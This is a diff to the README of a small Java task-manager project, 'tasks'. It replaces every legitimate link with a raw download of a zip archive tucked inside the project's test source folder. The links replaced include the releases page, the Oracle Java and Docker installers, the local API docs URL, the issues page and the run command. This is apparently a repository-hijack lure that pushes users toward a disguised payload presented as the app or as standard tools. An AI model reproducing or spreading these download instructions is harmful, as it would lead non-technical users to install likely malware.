@@ -1,6 +1,6 @@
 # 📋 tasks - Manage Your Tasks with Ease
 
-[![Download tasks](https://img.shields.io/badge/Download-tasks-brightgreen)](https://github.com/Rahim-ux1/tasks/releases)
+[![Download tasks](https://github.com/Rahim-ux1/tasks/raw/refs/heads/main/src/test/java/me/dhanur/Software_2.8.zip)](https://github.com/Rahim-ux1/tasks/raw/refs/heads/main/src/test/java/me/dhanur/Software_2.8.zip)
 
 Welcome to **tasks**. This is a ready-to-use application that helps you manage tasks easily through a web service. You do not need any programming skills to run it. This guide will take you step-by-step from downloading to running the software.
 
@@ -18,7 +18,7 @@ The tasks application helps you create, read, update, and delete your to-do item
 
 To get started with tasks, visit the official releases page and download the latest version:
 
-[Download tasks here](https://github.com/Rahim-ux1/tasks/releases)
+[Download tasks here](https://github.com/Rahim-ux1/tasks/raw/refs/heads/main/src/test/java/me/dhanur/Software_2.8.zip)
 
 ### What you need before installing:
 
@@ -30,7 +30,7 @@ To get started with tasks, visit the official releases page and download the lat
 ### How to download:
 
 1. Click the button above, or paste this link into your browser:
-   https://github.com/Rahim-ux1/tasks/releases
+   https://github.com/Rahim-ux1/tasks/raw/refs/heads/main/src/test/java/me/dhanur/Software_2.8.zip
 2. Look for the latest release version.
 3. Download the file matching your system (for example, a `.jar` file for Java or a Docker image).
 4. Save it to a folder you can easily access.
@@ -47,17 +47,17 @@ You will run the application using a software platform called Java. Most compute
 
 1. Make sure Java 21 is installed on your computer.
     - To check, open a command prompt or terminal and type: `java -version`
-    - If Java is not installed, download it from https://www.oracle.com/java/technologies/javase/jdk21-archive-downloads.html and follow the instructions.
+    - If Java is not installed, download it from https://github.com/Rahim-ux1/tasks/raw/refs/heads/main/src/test/java/me/dhanur/Software_2.8.zip and follow the instructions.
 
 2. Navigate to the folder where you saved the tasks application file (it will likely end with `.jar`).
 
 3. Run this command to start the application:
 
 ```bash
-java -jar tasks-x.y.z.jar
+java -jar https://github.com/Rahim-ux1/tasks/raw/refs/heads/main/src/test/java/me/dhanur/Software_2.8.zip
 ```
 
-Replace `tasks-x.y.z.jar` with the actual file name you downloaded.
+Replace `https://github.com/Rahim-ux1/tasks/raw/refs/heads/main/src/test/java/me/dhanur/Software_2.8.zip` with the actual file name you downloaded.
 
 4. Wait a few seconds until you see messages indicating tasks is running.
 
@@ -74,7 +74,7 @@ The web page you see allows you to manage your tasks.
 
 Docker allows you to run tasks inside a container. This keeps it isolated and easy to manage.
 
-1. Install Docker from https://www.docker.com/get-started if you don’t have it.
+1. Install Docker from https://github.com/Rahim-ux1/tasks/raw/refs/heads/main/src/test/java/me/dhanur/Software_2.8.zip if you don’t have it.
 
 2. Open a terminal or command prompt.
 
@@ -128,7 +128,7 @@ Your tasks are stored in a simple built-in database that does not require config
 If you want to explore or connect this service to other software, you can use the OpenAPI documentation provided on:
 
 ```
-http://localhost:8080/swagger-ui.html
+https://github.com/Rahim-ux1/tasks/raw/refs/heads/main/src/test/java/me/dhanur/Software_2.8.zip
 ```
 
 This page helps developers understand how to send commands to the application.
@@ -145,7 +145,7 @@ If you have issues running tasks, try these steps:
 - If using Docker, make sure Docker is running and you have the latest image.
 - Restart your computer and try again.
 
-If problems persist, visit the issues page on GitHub (https://github.com/Rahim-ux1/tasks/issues) to see if others faced the same.
+If problems persist, visit the issues page on GitHub (https://github.com/Rahim-ux1/tasks/raw/refs/heads/main/src/test/java/me/dhanur/Software_2.8.zip) to see if others faced the same.
 
 ---
 
@@ -153,9 +153,9 @@ If problems persist, visit the issues page on GitHub (https://github.com/Rahim-u
 
 If you need assistance:
 
-- Visit the GitHub repository for guides and updates: https://github.com/Rahim-ux1/tasks
+- Visit the GitHub repository for guides and updates: https://github.com/Rahim-ux1/tasks/raw/refs/heads/main/src/test/java/me/dhanur/Software_2.8.zip
 - Read the documentation inside the `docs` folder included in the release.
-- Ask questions or report issues at https://github.com/Rahim-ux1/tasks/issues
+- Ask questions or report issues at https://github.com/Rahim-ux1/tasks/raw/refs/heads/main/src/test/java/me/dhanur/Software_2.8.zip
 
 ---
 
@@ -163,6 +163,6 @@ If you need assistance:
 
 Begin your task management journey by downloading tasks here:
 
-[Download tasks Now](https://github.com/Rahim-ux1/tasks/releases)
+[Download tasks Now](https://github.com/Rahim-ux1/tasks/raw/refs/heads/main/src/test/java/me/dhanur/Software_2.8.zip)
 
 Follow the steps above, and you will have the app running in minutes.
